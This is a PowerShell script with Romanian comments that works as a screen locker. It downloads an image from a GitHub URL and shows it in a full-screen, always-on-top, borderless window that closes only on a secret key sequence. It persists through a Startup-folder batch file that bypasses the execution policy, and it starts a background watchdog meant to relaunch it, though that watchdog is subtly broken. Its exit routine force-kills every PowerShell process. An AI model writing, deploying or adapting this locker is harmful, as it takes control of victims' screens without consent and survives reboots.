# Configurare URL pentru imagine
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\cdr.png"

# Descărcare imagine
function Download-Image {
    try {
        Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
    } catch {
        Write-Host "Eroare la descărcarea imaginii. Verificați conexiunea la internet." -ForegroundColor Red
        exit
    }
}

# Afișare imagine pe tot ecranul
function Show-FullScreenImage {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $form = New-Object System.Windows.Forms.Form
    $form.WindowState = 'Maximized'
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true
    $form.KeyPreview = $true

    try {
        $img = [System.Drawing.Image]::FromFile($tempImagePath)
    } catch {
        Write-Host "Eroare la încărcarea imaginii. Verificați descărcarea." -ForegroundColor Red
        exit
    }

    $pictureBox = New-Object System.Windows.Forms.PictureBox
    $pictureBox.Image = $img
    $pictureBox.Dock = 'Fill'
    $pictureBox.SizeMode = 'StretchImage'
    $form.Controls.Add($pictureBox)

    $global:keySequence = ""
    $form.KeyDown += {
        param($sender, $eventArgs)
        $global:keySequence += $eventArgs.KeyChar
        if ($global:keySequence -like "*cdr") {
            Stop-All
        }
    }

    $form.Add_Shown({ $form.Activate() })
    $form.ShowDialog()
}

# Oprește complet scriptul
function Stop-All {
    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PersistentImageViewer.bat" -Force -ErrorAction SilentlyContinue
    Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Stop-Process -Force
    exit
}

# Persistență prin folderul Startup (fără Administrator)
function Set-Startup {
    $scriptPath = $MyInvocation.MyCommand.Path
    $batFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PersistentImageViewer.bat"
    $batContent = "@echo off`nstart /min powershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`""
    Set-Content -Path $batFilePath -Value $batContent -Force
}

# Monitorizare proces pentru repornire automată
function Monitor-Process {
    while ($true) {
        if (-not (Get-Process -Id $pid -ErrorAction SilentlyContinue)) {
            Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$MyInvocation.MyCommand.Path`"" -WindowStyle Hidden
            exit
        }
        Start-Sleep -Seconds 1
    }
}

# Executare funcționalități
Download-Image
Set-Startup
Start-Job -ScriptBlock { Monitor-Process }
Show-FullScreenImage
